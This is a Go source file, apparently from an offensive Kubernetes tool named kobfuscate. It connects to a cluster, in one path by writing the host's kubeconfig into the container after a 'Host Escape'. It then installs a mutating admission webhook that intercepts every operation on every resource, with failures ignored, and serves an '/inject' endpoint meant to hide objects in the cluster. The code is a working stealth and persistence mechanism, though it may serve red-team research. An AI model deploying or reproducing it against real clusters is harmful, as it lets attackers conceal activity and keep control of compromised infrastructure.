/*===========================================================================*\
 *           MIT License Copyright (c) 2022 Kris Nóva <kris@nivenly.com>     *
 *                                                                           *
 *                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                *
 *                ┃   ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗   ┃                *
 *                ┃   ████╗  ██║██╔═████╗██║   ██║██╔══██╗  ┃                *
 *                ┃   ██╔██╗ ██║██║██╔██║██║   ██║███████║  ┃                *
 *                ┃   ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║  ┃                *
 *                ┃   ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║  ┃                *
 *                ┃   ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝  ┃                *
 *                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                *
 *                                                                           *
 *                       This machine kills fascists.                        *
 *                                                                           *
\*===========================================================================*/

package kobfuscate

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"time"

	"k8s.io/apimachinery/pkg/util/intstr"

	v1 "k8s.io/api/core/v1"

	"k8s.io/client-go/tools/clientcmd"

	admissionregistrationv1 "k8s.io/api/admissionregistration/v1"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/sirupsen/logrus"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type Runtime struct {
	identifier string
	connected  bool
	namespace  string
	client     *kubernetes.Clientset
	labels     map[string]string

	caPEM         *bytes.Buffer
	certPEM       *bytes.Buffer
	privateKeyPEM *bytes.Buffer

	server   *http.Server
	self     *v1.Pod
	hostname string
}

const (
	EnvVarPodname     string = "PODNAME" // Note: This is set in the deploy script!
	NamespaceLocation string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
	HostKubeconfig    string = "/root/.kube/config"
)

var (
	DefaultAddrHost string        = ""
	DefaultAddrPort int32         = 3535
	RuntimeTimeout  time.Duration = time.Second * 3
)

func NewRuntime(identifier string) *Runtime {
	return &Runtime{
		identifier: identifier,
		labels: map[string]string{
			"app":  identifier,
			"n0va": identifier,
		},
	}
}

var (
	InjectionPath string = "/inject"
)

func (r *Runtime) DNSNames() []string {
	dnsNames := []string{
		r.identifier,
		r.identifier + "." + r.Namespace(),
		r.identifier + "." + r.Namespace() + ".svc",
	}
	return dnsNames
}

func (r *Runtime) ServiceName() string {
	return r.identifier + "." + r.Namespace() + ".svc"
}

func (r *Runtime) Addr() string {
	return fmt.Sprintf("%s:%d", DefaultAddrHost, DefaultAddrPort)
}

func (r *Runtime) Orgs() []string {
	return []string{r.identifier + ".n0va"}
}

// Todo we will need a "Generic" way to hide things in Kube
// Todo What will our "hide" input look like? maybe labels?

func (r *Runtime) Hide() error {
	if !r.connected {
		return fmt.Errorf("unable to hide until connected. use runtime.EscapeInit() or runtime.InClusterInit()")
	}

	logrus.Infof("Entropy. Generating mTLS material (this may take awhile)...")

	// Create Cert Material
	err := r.Certs()
	if err != nil {
		return fmt.Errorf("unable to generate TLS material for obfuscation: %v", err)
	}
	logrus.Infof("Generated mTLS cert material for MutatingWebhookConfiguration")

	// Idempotent MutatingWebhookConfiguration
	r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})

	// Create MutatingWebhookConfiguration
	fail := admissionregistrationv1.Ignore
	sideEffect := admissionregistrationv1.SideEffectClassNone
	m := &admissionregistrationv1.MutatingWebhookConfiguration{
		ObjectMeta: metav1.ObjectMeta{
			Name:      r.Identifier(),
			Namespace: r.Namespace(),
		},
		Webhooks: []admissionregistrationv1.MutatingWebhook{
			{
				Name: r.ServiceName(),
				ClientConfig: admissionregistrationv1.WebhookClientConfig{
					URL: nil,
					Service: &admissionregistrationv1.ServiceReference{
						Namespace: r.Namespace(),
						Name:      r.Identifier(),
						Path:      &InjectionPath,
						Port:      &DefaultAddrPort,
					},
					CABundle: r.caPEM.Bytes(), // Inject CA Pem for the API server here!
				},
				Rules: []admissionregistrationv1.RuleWithOperations{
					{
						Operations: []admissionregistrationv1.OperationType{
							admissionregistrationv1.OperationAll,
						},
						Rule: admissionregistrationv1.Rule{
							APIGroups:   []string{"*"},
							APIVersions: []string{"*"},
							Resources:   []string{"*"},
						},
					},
				},
				FailurePolicy:           &fail,
				SideEffects:             &sideEffect,
				AdmissionReviewVersions: []string{"v1", "v1beta1"},
			},
		},
	}
	_, err = r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Create(context.TODO(), m, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create MutatingWebhookConfiguration: %v", err)
	}
	logrus.Infof("Created: MutatingWebhookConfiguration [%s.%s]", r.Identifier(), r.Namespace())

	// Ensure self has labels
	self := r.Self()
	if self != nil {
		for k, v := range r.labels {
			logrus.Infof("Setting Label:        %s:%s", k, v)
			self.Labels[k] = v
		}
		_, err = r.Client().CoreV1().Pods(r.Namespace()).Update(context.TODO(), self, metav1.UpdateOptions{})
		if err != nil {
			return fmt.Errorf("unable to update self: %v", err)
		}
		logrus.Infof("Updated: Self [%s.%s] labels", self.Name, r.Namespace())
	} else {
		logrus.Warnf("Unable to update self pod!")
	}

	// Idempotent Service
	r.Client().CoreV1().Services(r.Namespace()).Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})

	// Create Service
	s := &v1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      r.Identifier(),
			Namespace: r.Namespace(),
		},
		Spec: v1.ServiceSpec{
			Ports: []v1.ServicePort{
				{
					Port: DefaultAddrPort,
					TargetPort: intstr.IntOrString{
						IntVal: DefaultAddrPort,
					},
				},
			},
			Selector: map[string]string{
				"app":  r.Identifier(),
				"n0va": r.Identifier(),
			},
		},
	}
	_, err = r.Client().CoreV1().Services(r.Namespace()).Create(context.TODO(), s, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create Service: %v", err)
	}
	logrus.Infof("Created: Service [%s]", r.Identifier())

	pair, err := tls.X509KeyPair(r.certPEM.Bytes(), r.privateKeyPEM.Bytes())
	if err != nil {
		return fmt.Errorf("failed to load certificate key pair: %v", err)
	}

	logrus.Infof("Generated X509 pair for server")

	server := &http.Server{
		Addr:      r.Addr(),
		TLSConfig: &tls.Config{Certificates: []tls.Certificate{pair}},
	}

	logrus.Infof("Initalizing server [%s]", r.Addr())

	// Handle paths
	mux := &http.ServeMux{}
	mux.HandleFunc(InjectionPath, HandleInject)
	logrus.Infof("Registering endpoint: %s", InjectionPath)

	// Set the handler
	server.Handler = mux
	r.server = server
	logrus.Infof("Listening on %s%s...", r.ServiceName(), InjectionPath)
	server.ListenAndServeTLS("", "")
	return nil
}

func (r *Runtime) Open() error {
	r.hostname = os.Getenv("HOSTNAME")
	if r.hostname != "" {
		logrus.Infof("Hostname: %s", r.hostname)
	} else {
		logrus.Warnf("Empty Environmental Variable HOSTNAME")
	}
	// Add labels to self
	pod, err := r.Client().CoreV1().Pods(r.Namespace()).Get(context.TODO(), os.Getenv("PODNAME"), metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("unable to list pods: %v", err)
	}
	if pod != nil {
		r.self = pod
		logrus.Infof("Found self: %s", pod.Name)
	}
	return nil
}

func (r *Runtime) Close() {
	if !r.connected {
		return
	}
	logrus.Warnf("Closing...")
	if r.server != nil {
		r.server.Shutdown(context.Background())
		logrus.Infof("Shutting down server [%s]", r.Addr())
	}
	err := r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
	if err == nil {
		logrus.Infof("Deleted: MutatingWebhookConfiguration [%s.%s]", r.Identifier(), r.Namespace())
	}
	err = r.Client().CoreV1().Services(r.Namespace()).Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
	if err == nil {
		logrus.Infof("Deleted: Service [%s.%s]", r.Identifier(), r.Namespace())
	}
}

func (r *Runtime) EscapeInit() error {

	logrus.Infof("Initializing Kubernetes Client [Host Escape]")

	// Host config
	kubeconfig, err := HostKubeConfig()
	if err != nil {
		return fmt.Errorf("unable to find host kubeconfig: %v", err)
	}
	err = ioutil.WriteFile(HostKubeconfig, []byte(kubeconfig), 0755)
	if err != nil {
		return fmt.Errorf("unable to write /tmp kubeconfig: %v", err)
	}
	logrus.Infof("Wrote kubeconfig inside container: %s", HostKubeconfig)

	cfg, err := clientcmd.BuildConfigFromFlags("", HostKubeconfig)
	if err != nil {
		return fmt.Errorf("unable to build config: %v", err)
	}

	// Client
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Kubernetes Host : %s", cfg.Host)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())
	logrus.Infof("Connected to Kubernetes!")

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	r.connected = true
	return r.Open()
}

// InClusterInit will ensure the client and see if we are running inside a cluster
func (r *Runtime) InClusterInit() error {

	// In cluster
	cfg, err := rest.InClusterConfig()
	if err != nil {
		return err
	}

	// Client
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Kubernetes Host : %s", cfg.Host)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())
	logrus.Infof("Connected to Kubernetes!")

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	r.connected = true
	return r.Open()
}

func (r *Runtime) Client() *kubernetes.Clientset {
	return r.client
}

func (r *Runtime) Self() *v1.Pod {
	return r.self
}

func (r *Runtime) Identifier() string {
	return r.identifier
}

func (r *Runtime) Namespace() string {
	if r.namespace == "" {
		bytes, err := ioutil.ReadFile(NamespaceLocation)
		if err != nil {
			return "default"
		}
		r.namespace = string(bytes)
	}
	return r.namespace
}
